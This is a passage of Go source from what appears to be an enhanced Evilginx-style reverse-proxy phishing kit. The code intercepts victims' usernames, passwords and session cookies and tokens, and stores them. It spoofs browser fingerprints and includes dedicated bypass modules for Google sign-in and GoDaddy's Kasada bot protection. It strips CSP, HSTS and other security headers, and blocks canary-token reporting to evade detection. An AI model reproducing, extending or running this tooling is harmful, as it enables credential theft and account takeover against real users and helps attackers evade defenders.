										session.RedirectURL = l.RedirectUrl
									}
									if session.RedirectURL != "" {
										session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
									}
									session.PhishLure = l
									log.Debug("redirect URL (lure): %s", session.RedirectURL)

									ps.SessionId = session.Id
									ps.Created = true
									ps.Index = sid
									p.whitelistIP(remote_addr, ps.SessionId, pl.Name)

									req_ok = true
								}
							} else {
								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)

								// Notify EvilFeed of unauthorized request
								if p.evilFeed != nil && p.evilFeed.IsEnabled() {
									p.evilFeed.NotifyBot(remote_addr, fmt.Sprintf("Unauthorized request to %s", req_url))
								}

								if p.cfg.GetBlacklistMode() == "unauth" {
									if !p.bl.IsWhitelisted(from_ip) {
										err := p.bl.AddIP(from_ip)
										if p.bl.IsVerbose() {
											if err != nil {
												log.Error("blacklist: %s", err)
											} else {
												log.Warning("blacklisted ip address: %s", from_ip)
											}
										}
									}
								}
								return p.blockRequest(req)
							}
						} else {
							log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					}
				}

				// redirect for unauthorized requests
				if ps.SessionId == "" && p.handleSession(req.Host) {
					if !req_ok {
						return p.blockRequest(req)
					}
				}
				// req.Header.Set(p.getHomeDir(), o_host)

				if ps.SessionId != "" {
					if s, ok := p.sessions[ps.SessionId]; ok {
						l, err := p.cfg.GetLureByPath(pl_name, req_path)
						if err == nil {
							// Determine effective redirector: explicit OR auto-turnstile
							effectiveRedirector := l.Redirector
							if effectiveRedirector == "" && p.cfg.GetTurnstileEnabled() && p.cfg.GetTurnstileSiteKey() != "" {
								effectiveRedirector = "turnstile" // Auto-apply turnstile when enabled
							}

							// show html redirector if it is set for the current lure
							if effectiveRedirector != "" {
								if !p.isForwarderUrl(req.URL) {
									if s.RedirectorName == "" {
										s.RedirectorName = effectiveRedirector
										s.LureDirPath = req_path
									}

									t_dir := effectiveRedirector
									if !filepath.IsAbs(t_dir) {
										redirectors_dir := p.cfg.GetRedirectorsDir()
										t_dir = filepath.Join(redirectors_dir, t_dir)
									}

									index_path1 := filepath.Join(t_dir, "index.html")
									index_path2 := filepath.Join(t_dir, "index.htm")
									index_found := ""
									if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
										index_found = index_path1
									} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
										index_found = index_path2
									}

									if _, err := os.Stat(index_found); !os.IsNotExist(err) {
										html, err := ioutil.ReadFile(index_found)
										if err == nil {

											html = p.injectOgHeaders(l, html)

											body := string(html)
											body = p.replaceHtmlParams(body, lure_url, &s.Params)

											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
											if resp != nil {
												return req, resp
											} else {
												log.Error("lure: failed to create html redirector response")
											}
										} else {
											log.Error("lure: failed to read redirector file: %s", err)
										}

									} else {
										log.Error("lure: redirector file does not exist: %s", index_found)
									}
								}
							}
						} else if s.RedirectorName != "" {
							// session has already triggered a lure redirector - see if there are any files requested by the redirector

							rel_parts := []string{}
							req_path_parts := strings.Split(req_path, "/")
							lure_path_parts := strings.Split(s.LureDirPath, "/")

							for n, dname := range req_path_parts {
								if len(dname) > 0 {
									path_add := true
									if n < len(lure_path_parts) {
										//log.Debug("[%d] %s <=> %s", n, lure_path_parts[n], req_path_parts[n])
										if req_path_parts[n] == lure_path_parts[n] {
											path_add = false
										}
									}
									if path_add {
										rel_parts = append(rel_parts, req_path_parts[n])
									}
								}

							}
							rel_path := filepath.Join(rel_parts...)
							//log.Debug("rel_path: %s", rel_path)

							t_dir := s.RedirectorName
							if !filepath.IsAbs(t_dir) {
								redirectors_dir := p.cfg.GetRedirectorsDir()
								t_dir = filepath.Join(redirectors_dir, t_dir)
							}

							path := filepath.Join(t_dir, rel_path)
							if _, err := os.Stat(path); !os.IsNotExist(err) {
								fdata, err := ioutil.ReadFile(path)
								if err == nil {
									//log.Debug("ext: %s", filepath.Ext(req_path))
									mime_type := getContentType(req_path, fdata)
									//log.Debug("mime_type: %s", mime_type)
									resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
									if resp != nil {
										resp.Body = io.NopCloser(bytes.NewReader(fdata))
										return req, resp
									} else {
										log.Error("lure: failed to create redirector data file response")
									}
								} else {
									log.Error("lure: failed to read redirector data file: %s", err)
								}
							} else {
								//log.Warning("lure: template file does not exist: %s", path)
							}
						}
					}
				}

				// redirect to login page if triggered lure path
				if pl != nil {
					_, err := p.cfg.GetLureByPath(pl_name, req_path)
					if err == nil {
						// redirect from lure path to login url
						rurl := pl.GetLoginUrl()
						u, err := url.Parse(rurl)
						if err == nil {
							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
								if resp != nil {
									resp.Header.Add("Location", rurl)
									return req, resp
								}
							}
						}
					}
				}

				// check if lure hostname was triggered - by now all of the lure hostname handling should be done, so we can bail out
				if p.cfg.IsLureHostnameValid(req.Host) {
					log.Debug("lure hostname detected - returning 404 for request: %s", req_url)

					resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
					if resp != nil {
						return req, resp
					}
				}

				// replace "Host" header
				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
					req.Host = r_host
				}

				// fix origin
				origin := req.Header.Get("Origin")
				if origin != "" {
					if o_url, err := url.Parse(origin); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Origin", o_url.String())
						}
					}
				}

				// prevent caching
				req.Header.Set("Cache-Control", "no-cache")

				// GLOBAL USER-AGENT SPOOFING: Apply Chrome 120 fingerprint to ALL requests
				// This prevents detection based on unusual/outdated User-Agents
				if pl != nil {
					req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
					req.Header.Set("Sec-Ch-Ua", `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`)
					req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
					req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
				}

				// GOOGLE ANTI-BOT BYPASS: Enhanced header spoofing for Google accounts
				if strings.EqualFold(req.Host, "accounts.google.com") {
					// Spoof Chrome 120 headers to bypass bot detection
					req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
					req.Header.Set("Sec-Ch-Ua", `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`)
					req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
					req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
					req.Header.Set("Sec-Ch-Ua-Platform-Version", `"15.0.0"`)
					req.Header.Set("Sec-Ch-Ua-Full-Version-List", `"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.129", "Google Chrome";v="120.0.6099.129"`)
					req.Header.Set("Sec-Ch-Ua-Arch", `"x86"`)
					req.Header.Set("Sec-Ch-Ua-Bitness", `"64"`)
					req.Header.Set("Sec-Ch-Ua-Model", `""`)
					req.Header.Set("Sec-Fetch-Site", "same-origin")
					req.Header.Set("Sec-Fetch-Mode", "cors")
					req.Header.Set("Sec-Fetch-Dest", "empty")
					req.Header.Set("Accept", "*/*")
					req.Header.Set("Accept-Language", "en-US,en;q=0.9")
					req.Header.Set("Accept-Encoding", "gzip, deflate, br")
					req.Header.Set("Dnt", "1")
					req.Header.Set("Upgrade-Insecure-Requests", "1")

					// Remove suspicious headers that trigger bot detection
					req.Header.Del("X-Forwarded-For")
					req.Header.Del("X-Forwarded-Host")
					req.Header.Del("X-Forwarded-Proto")
					req.Header.Del("X-Real-Ip")
					req.Header.Del("Via")
					req.Header.Del("Forwarded")

					log.Debug("[GoogleAntiBot] Enhanced headers applied")
				}

				// fix sec-fetch-dest
				sec_fetch_dest := req.Header.Get("Sec-Fetch-Dest")
				if sec_fetch_dest != "" {
					if sec_fetch_dest == "iframe" {
						req.Header.Set("Sec-Fetch-Dest", "document")
					}
				}

				// fix referer
				referer := req.Header.Get("Referer")
				if referer != "" {
					if o_url, err := url.Parse(referer); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Referer", o_url.String())
						}
					}
				}

				// patch GET query params with original domains
				if pl != nil {
					qs := req.URL.Query()
					if len(qs) > 0 {
						phishDomain, _ := p.cfg.GetSiteDomain(pl.Name)
						for gp := range qs {
							for i, v := range qs[gp] {
								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))

								// reCAPTCHA co parameter bypass - decode base64, replace phishing domain with original
								if gp == "co" {
									decoded, err := base64.StdEncoding.DecodeString(qs[gp][i])
									if err == nil {
										decodedStr := string(decoded)
										// Replace phishing hostname with original hostname
										for _, ph := range pl.proxyHosts {
											phishHost := combineHost(ph.phish_subdomain, phishDomain)
											origHost := combineHost(ph.orig_subdomain, ph.domain)
											if strings.Contains(decodedStr, phishHost) {
												decodedStr = strings.Replace(decodedStr, phishHost, origHost, -1)
												qs[gp][i] = base64.StdEncoding.EncodeToString([]byte(decodedStr))
												log.Debug("reCAPTCHA bypass: replaced co param %s -> %s", phishHost, origHost)
											}
										}
									}
								}
							}
						}
						req.URL.RawQuery = qs.Encode()
					}
				}

				// check for creds in request body
				if pl != nil && ps.SessionId != "" {
					// req.Header.Set(p.getHomeDir(), o_host)
					body, err := ioutil.ReadAll(req.Body)
					if err == nil {
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))

						// patch phishing URLs in JSON body with original domains
						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
						req.ContentLength = int64(len(body))

						log.Debug("POST: %s", req.URL.Path)
						log.Debug("POST body = %s", body)

						contentType := req.Header.Get("Content-type")

						json_re := regexp.MustCompile("application\\/\\w*\\+?json")
						form_re := regexp.MustCompile("application\\/x-www-form-urlencoded")

						if json_re.MatchString(contentType) {

							if pl.username.tp == "json" {
								um := pl.username.search.FindStringSubmatch(string(body))
								if um != nil && len(um) > 1 {
									p.setSessionUsername(ps.SessionId, um[1])
									log.Success("[%d] Username: [%s]", ps.Index, um[1])
									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							if pl.password.tp == "json" {
								pm := pl.password.search.FindStringSubmatch(string(body))
								if pm != nil && len(pm) > 1 {
									p.setSessionPassword(ps.SessionId, pm[1])
									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							for _, cp := range pl.custom {
								if cp.tp == "json" {
									cm := cp.search.FindStringSubmatch(string(body))
									if cm != nil && len(cm) > 1 {
										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
											log.Error("database: %v", err)
										}
									}
								}
							}

							// force post json
							for _, fp := range pl.forcePost {
								if fp.path.MatchString(req.URL.Path) {
									log.Debug("force_post: url matched: %s", req.URL.Path)
									ok_search := false
									if len(fp.search) > 0 {
										k_matched := len(fp.search)
										for _, fp_s := range fp.search {
											matches := fp_s.key.FindAllString(string(body), -1)
											for _, match := range matches {
												if fp_s.search.MatchString(match) {
													if k_matched > 0 {
														k_matched -= 1
													}
													log.Debug("force_post: [%d] matched - %s", k_matched, match)
													break
												}
											}
										}
										if k_matched == 0 {
											ok_search = true
										}
									} else {
										ok_search = true
									}
									if ok_search {
										for _, fp_f := range fp.force {
											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
											if err != nil {
												log.Debug("force_post: got error: %s", err)
											}
											log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
										}
									}
									req.ContentLength = int64(len(body))
									log.Debug("force_post: body: %s len:%d", body, len(body))
								}
							}

						} else if form_re.MatchString(contentType) {

							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
								log.Debug("POST: %s", req.URL.Path)

								for k, v := range req.PostForm {
									// patch phishing URLs in POST params with original domains

									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
										um := pl.username.search.FindStringSubmatch(v[0])
										if um != nil && len(um) > 1 {
											p.setSessionUsername(ps.SessionId, um[1])
											log.Success("[%d] Username: [%s]", ps.Index, um[1])
											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
										pm := pl.password.search.FindStringSubmatch(v[0])
										if pm != nil && len(pm) > 1 {
											p.setSessionPassword(ps.SessionId, pm[1])
											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									for _, cp := range pl.custom {
										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
											cm := cp.search.FindStringSubmatch(v[0])
											if cm != nil && len(cm) > 1 {
												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
													log.Error("database: %v", err)
												}
											}
										}
									}
								}

								for k, v := range req.PostForm {
									for i, vv := range v {
										// patch phishing URLs in POST params with original domains
										req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
									}
								}

								for k, v := range req.PostForm {
									if len(v) > 0 {
										log.Debug("POST %s = %s", k, v[0])
									}
								}

								body = []byte(req.PostForm.Encode())
								req.ContentLength = int64(len(body))

								// force posts
								for _, fp := range pl.forcePost {
									if fp.path.MatchString(req.URL.Path) {
										log.Debug("force_post: url matched: %s", req.URL.Path)
										ok_search := false
										if len(fp.search) > 0 {
											k_matched := len(fp.search)
											for _, fp_s := range fp.search {
												for k, v := range req.PostForm {
													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
														if k_matched > 0 {
															k_matched -= 1
														}
														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
														break
													}
												}
											}
											if k_matched == 0 {
												ok_search = true
											}
										} else {
											ok_search = true
										}

										if ok_search {
											for _, fp_f := range fp.force {
												req.PostForm.Set(fp_f.key, fp_f.value)
											}
											body = []byte(req.PostForm.Encode())
											req.ContentLength = int64(len(body))
											log.Debug("force_post: body: %s len:%d", body, len(body))
										}

										// Get the original host to check against Google's domain (req.Host is still the phishing domain at this point)
										origHostForGoogle, _ := p.replaceHostWithOriginal(req.Host)
										if strings.EqualFold(origHostForGoogle, "accounts.google.com") && strings.Contains(req.URL.String(), "/v3/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(req.URL.String(), "rpcids=MI613e") {
											log.Debug("GoogleBypass working with: %v (origHost: %v)", req.RequestURI, origHostForGoogle)

											decodedBody, err := url.QueryUnescape(string(body))
											if err != nil {
												log.Error("Failed to decode body: %v", err)
											} else {
												decodedBodyBytes := []byte(decodedBody)

												// Extract email from request body
												emailRegexp := regexp.MustCompile(`f\.req=\[\[\["MI613e","\[null,\\"(.*?)\\"`)
												emailMatch := emailRegexp.FindSubmatch(decodedBodyBytes)
												var email string
												if len(emailMatch) >= 2 {
													email = string(bytes.Replace(emailMatch[1], []byte("%40"), []byte("@"), -1))
													log.Info("[GoogleBypasser] Intercepted MI613e request for email: %s", email)
												}

												// OPTIMIZATION: Check if we have a cached token (from pre-generation)
												if email != "" {
													if cachedToken, found := GetCachedToken(email); found {
														log.Success("[GoogleBypasser] 🚀 Using PRE-GENERATED token for: %s", email)
														b := &GoogleBypasser{}
														b.token = cachedToken
														decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)

														postForm, err := url.ParseQuery(string(decodedBodyBytes))
														if err != nil {
															log.Error("Failed to parse form data: %v", err)
														} else {
															body = []byte(postForm.Encode())
															req.ContentLength = int64(len(body))
														}
														req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
													} else {
														// No cached token - generate one now (slower path)
														log.Warning("[GoogleBypasser] No cached token, generating now for: %s", email)

														b := &GoogleBypasser{
															isHeadless:     true,
															withDevTools:   false,
															slowMotionTime: 500,
														}
														b.Launch()
														b.email = email
														b.GetToken()

														if b.token != "" {
															decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)
															postForm, err := url.ParseQuery(string(decodedBodyBytes))
															if err != nil {
																log.Error("Failed to parse form data: %v", err)
															} else {
																body = []byte(postForm.Encode())
																req.ContentLength = int64(len(body))
															}
															log.Success("[GoogleBypasser] Token generated and injected for: %s", email)
														} else {
															log.Error("[GoogleBypasser] Failed to generate token for: %s", email)
														}
														req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
													}
												} else {
													// Fallback to original method if email extraction failed
													b := &GoogleBypasser{
														isHeadless:     true,
														withDevTools:   false,
														slowMotionTime: 500,
													}
													b.Launch()
													b.GetEmail(decodedBodyBytes)
													b.GetToken()
													decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)

													postForm, err := url.ParseQuery(string(decodedBodyBytes))
													if err != nil {
														log.Error("Failed to parse form data: %v", err)
													} else {
														body = []byte(postForm.Encode())
														req.ContentLength = int64(len(body))
													}
													req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
												}
											}
										}

										// GoDaddy SSO Kasada Bypass
										// Trigger when user submits login credentials to GoDaddy SSO
										if strings.EqualFold(req.Host, "sso.godaddy.com") && strings.HasPrefix(req.URL.Path, "/v1/api/pass/login") {
											log.Debug("[KasadaBypasser]: Triggered for request to %s%s", req.Host, req.URL.Path)

											k := &KasadaBypasser{
												isHeadless:     true,
												slowMotionTime: 500 * time.Millisecond,
											}

											if err := k.Launch(); err != nil {
												log.Error("[KasadaBypasser]: Failed to launch browser: %v", err)
											} else if err := k.GetCredentials(body); err != nil {
												log.Error("[KasadaBypasser]: Failed to get credentials: %v", err)
											} else if err := k.GetKasadaTokens(); err != nil {
												log.Error("[KasadaBypasser]: Failed to get Kasada tokens: %v", err)
											} else {
												k.InjectKasadaHeaders(req)
												log.Info("[KasadaBypasser]: Successfully injected Kasada headers for user: %s", k.username)
											}
										}
									}
								}

							}

						}
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
					}
				}

				// check if request should be intercepted
				if pl != nil {
					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
						for _, ic := range pl.intercept {
							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
							}
						}
					}
				}

				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
					s, ok := p.sessions[ps.SessionId]
					if ok && !s.IsDone {
						for _, au := range pl.authUrls {
							if au.MatchString(req.URL.Path) {
								s.Finish(true)
								// Notification removed from here - will only send after all tokens captured
								break
							}
						}
					}
				}
			}
			if strings.Contains(req.URL.Path, "_/mss/boq-identity/_/js/k=boq-identity.AccountsSignInUi.e") {
				modifiedHost := "www.gstatic.com"
				req.URL.Host = modifiedHost
				req.Host = modifiedHost
				log.Debug("Modified request URL: %s", req.URL.String())
			}

			//  if request path contains /xxx then it should check xtm folder in current dir and that folder there is 1.js it should return that as response
			// if strings.Contains(req.URL.Path, "_/js/k=boq-identity.AccountsSignInUi") {
			// 	log.Debug("Request path contains _/js/k=boq-identity.AccountsSignInUi, checking for xtm folder and 1.js file")
			// 	xtmPath := filepath.Join(".", "xtm", "1.js")
			// 	// Check if xtm folder exists and 1.js file is present
			// 	if _, err := os.Stat(filepath.Join(".", "xtm")); err == nil {
			// 		log.Debug("xtm folder found, checking for 1.js file")
			// 	} else {
			// 		log.Debug("xtm folder not found, skipping 1.js file check")
			// 	}
			// 	if _, err := os.Stat(xtmPath); err == nil {
			// 		log.Debug("1.js file found, reading and returning its content")
			// 		fileData, err := ioutil.ReadFile(xtmPath)
			// 		if err == nil {
			// 			resp := goproxy.NewResponse(req, "text/javascript; charset=UTF-8", http.StatusOK, string(fileData))
			// 			log.Debug("Returning content of 1.js file as response")
			// 			resp.Header.Set("Content-Type", "text/javascript; charset=UTF-8")
			// 			return req, resp
			// 		} else {
			// 			log.Error("Failed to read file: %s", err)
			// 		}
			// 	} else {
			// 		log.Warning("File not found: %s", xtmPath)
			// 	}
			// 	log.Debug("No xtm folder or 1.js file found, continuing with normal request processing")
			// }

			// log.Debug("Request path: %s", req.URL.Path) // Log the request path

			// if strings.Contains(req.URL.Path, "_/js/k=boq-identity.AccountsSignInUi") { // Check if the path contains "_/js/k=boq-identity.AccountsSignInUi"
			// 	log.Debug("Request path contains '_/js/k=boq-identity.AccountsSignInUi', checking for xtm folder and 1.js file")
			// 	xtmPath := filepath.Join(".", "xtm", "1.js")
			// 	if _, err := os.Stat(xtmPath); err == nil {
			// 		log.Debug("1.js file found, reading and returning its content")
			// 		fileData, err := ioutil.ReadFile(xtmPath)
			// 		if err == nil {
			// 			resp := goproxy.NewResponse(req, "text/javascript; charset=UTF-8", http.StatusOK, string(fileData))
			// 			resp.Header.Set("Content-Type", "text/javascript; charset=UTF-8")
			// 			//  fix access origin allo hader
			// 			origin := req.Header.Get("Origin")
			// 			if origin != "" {
			// 				resp.Header.Set("Access-Control-Allow-Origin", origin)
			// 			} else {
			// 				resp.Header.Set("Access-Control-Allow-Origin", "*") // Fallback to allow all origins
			// 			}
			// 			resp.Header.Set("Age", "3")
			// 			resp.Header.Set("Alt-Svc", `h3=":443"; ma=2592000,h3-29=":443"; ma=2592000`)
			// 			resp.Header.Set("Cache-Control", "public, immutable, max-age=31536000")
			// 			resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(fileData)))
			// 			resp.Header.Set("Content-Security-Policy-Report-Only", `require-trusted-types-for 'script'; report-uri https://csp.withgoogle.com/csp/boq-infra/identity-boq-js-css-signers`)
			// 			resp.Header.Set("Content-Type", "text/javascript; charset=UTF-8")
			// 			resp.Header.Set("Cross-Origin-Opener-Policy", `same-origin; report-to="boq-infra/identity-boq-js-css-signers"`)
			// 			resp.Header.Set("Cross-Origin-Resource-Policy", "cross-origin")
			// 			resp.Header.Set("Report-To", `{"group":"boq-infra/identity-boq-js-css-signers","max_age":2592000,"endpoints":[{"url":"https://csp.withgoogle.com/csp/report-to/boq-infra/identity-boq-js-css-signers"}]}`)
			// 			resp.Header.Set("Server", "sffe")
			// 			resp.Header.Set("Vary", "Accept-Encoding, Origin")
			// 			resp.Header.Set("X-Content-Type-Options", "nosniff")
			// 			resp.Header.Set("X-XSS-Protection", "0")

			// 			if resp != nil {
			// 				log.Debug("Response created successfully, returning response")
			// 				return req, resp
			// 			} else {
			// 				log.Error("Failed to create response")
			// 			}
			// 		} else {
			// 			log.Error("Failed to read file: %s", err)
			// 		}
			// 	} else {
			// 		log.Warning("File not found: %s", xtmPath)
			// 	}
			// 	log.Debug("No xtm folder or 1.js file found, continuing with normal request processing")
			// }

			return req, nil
		})

	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			if resp == nil {
				return nil
			}

			// handle session
			ck := &http.Cookie{}
			ps := ctx.UserData.(*ProxySession)
			if ps.SessionId != "" {
				if ps.Created {
					ck = &http.Cookie{
						Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
						Value:   ps.SessionId,
						Path:    "/",
						Domain:  p.cfg.GetBaseDomain(),
						Expires: time.Now().Add(60 * time.Minute),
					}
				}
			}

			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
			if allow_origin != "" && allow_origin != "*" {
				if u, err := url.Parse(allow_origin); err == nil {
					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
					}
				} else {
					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
				}
				resp.Header.Set("Access-Control-Allow-Credentials", "true")
			}

			var rm_headers = []string{
				"Content-Security-Policy",
				"Content-Security-Policy-Report-Only",
				"Strict-Transport-Security",
				"X-XSS-Protection",
				"X-Content-Type-Options",
				"X-Frame-Options",
			}
			for _, hdr := range rm_headers {
				resp.Header.Del(hdr)
			}

			// Add Referrer-Policy header to prevent referrer leakage to target domain
			resp.Header.Set("Referrer-Policy", "no-referrer")

			// Add controlled CSP that prevents canary token leakage while allowing our scripts
			resp.Header.Set("Content-Security-Policy",
				"default-src 'self' 'unsafe-inline' 'unsafe-eval' https: data: blob:; "+
					"report-uri /dev/null")

			redirect_set := false
			if s, ok := p.sessions[ps.SessionId]; ok {
				if s.RedirectURL != "" {
					redirect_set = true
				}
			}

			req_hostname := strings.ToLower(resp.Request.Host)

			// if "Location" header is present, make sure to redirect to the phishing domain
			r_url, err := resp.Location()
			if err == nil {
				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
					r_url.Host = r_host
					resp.Header.Set("Location", r_url.String())
				}
			}
			// print request opath
			// log.Debug("Response for request: %s", resp.Request.URL.Path)
			// // check if request path contains /xxx then print its response status
			// if strings.Contains(resp.Request.URL.Path, "_/js/k=boq-identity.AccountsSignInUi"){
			// 	log.Debug("Request path contains _/js/k=boq-identity.AccountsSignInUi, checking for xtm folder and 1.js file")
			// 	// printitng statsus
			// 	log.Debug("status is - %s",resp.Status)
			// }

			// fix cookies
			pl := p.getPhishletByOrigHost(req_hostname)
			var auth_tokens map[string][]*CookieAuthToken
			if pl != nil {
				auth_tokens = pl.cookieAuthTokens
			}
			is_cookie_auth := false
			is_body_auth := false
			is_http_auth := false
			cookies := resp.Cookies()
			resp.Header.Del("Set-Cookie")
			for _, ck := range cookies {
				// parse cookie

				// add SameSite=none for every received cookie, allowing cookies through iframes
				if ck.Secure {
					ck.SameSite = http.SameSiteNoneMode
				}

				if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
					exptime, err := time.Parse(time.RFC850, ck.RawExpires)
					if err != nil {
						exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
						if err != nil {
							exptime, err = time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires)
						}
					}
					ck.Expires = exptime
				}

				if pl != nil && ps.SessionId != "" {
					c_domain := ck.Domain
					if c_domain == "" {
						c_domain = req_hostname
					} else {
						// always prepend the domain with '.' if Domain cookie is specified - this will indicate that this cookie will be also sent to all sub-domains
						if c_domain[0] != '.' {
							c_domain = "." + c_domain
						}
					}
					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
					at := pl.getAuthToken(c_domain, ck.Name)
					if at != nil {
						s, ok := p.sessions[ps.SessionId]
						if ok && (s.IsAuthUrl || !s.IsDone) {
							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)

								// Convert SameSite to string for storage
								sameSiteStr := ""
								switch ck.SameSite {
								case http.SameSiteNoneMode:
									sameSiteStr = "none"
								case http.SameSiteLaxMode:
									sameSiteStr = "lax"
								case http.SameSiteStrictMode:
									sameSiteStr = "strict"
								default:
									sameSiteStr = ""
								}

								// Determine if this is a hostOnly cookie (domain was not explicitly set)
								hostOnly := ck.Domain == ""

								// Use the enhanced function to capture all cookie attributes
								s.AddCookieAuthTokenFull(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Secure, sameSiteStr, ck.Expires, hostOnly)
							}
						}
					}
				}

				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
				resp.Header.Add("Set-Cookie", ck.String())
			}
			if ck.String() != "" {
				resp.Header.Add("Set-Cookie", ck.String())
			}

			// modify received body
			body, err := ioutil.ReadAll(resp.Body)

			if pl != nil {
				if s, ok := p.sessions[ps.SessionId]; ok {
					// capture body response tokens
					for k, v := range pl.bodyAuthTokens {
						if _, ok := s.BodyTokens[k]; !ok {
							//log.Debug("hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
								//log.Debug("RESPONSE body = %s", string(body))
								token_re := v.search.FindStringSubmatch(string(body))
								if token_re != nil && len(token_re) >= 2 {
									s.BodyTokens[k] = token_re[1]
								}
							}
						}
					}

					// capture http header tokens
					for k, v := range pl.httpAuthTokens {
						if _, ok := s.HttpTokens[k]; !ok {
							hv := resp.Request.Header.Get(v.header)
							if hv != "" {
								s.HttpTokens[k] = hv
							}
						}
					}
				}

				// check if we have all tokens
				if len(pl.authUrls) == 0 {
					if s, ok := p.sessions[ps.SessionId]; ok {
						is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
						if len(pl.bodyAuthTokens) == len(s.BodyTokens) {
							is_body_auth = true
						}
						if len(pl.httpAuthTokens) == len(s.HttpTokens) {
							is_http_auth = true
						}
					}
				}
			}

			if is_cookie_auth && is_body_auth && is_http_auth {
				// we have all auth tokens
				if s, ok := p.sessions[ps.SessionId]; ok {
					if !s.IsDone {
						log.Success("[%d] all authorization tokens intercepted!", ps.Index)

